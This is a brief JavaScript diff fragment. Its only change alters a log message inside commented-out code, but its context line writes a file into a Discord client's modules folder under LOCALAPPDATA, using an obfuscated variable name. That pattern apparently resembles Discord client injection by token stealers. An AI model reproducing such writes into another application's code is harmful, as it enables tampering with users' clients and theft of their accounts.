@@ -11,5 +11,5 @@ fs.writeFile(process.env.LOCALAPPDATA + "/DiscordPTB/" + a3b80a + "/modules/disc
 
 /*fs.appendFile('', ' This is my text.', function (err) {
   if (err) throw err;
-  console.log('Updated!');
+  console.log('Linked!');
 });*/
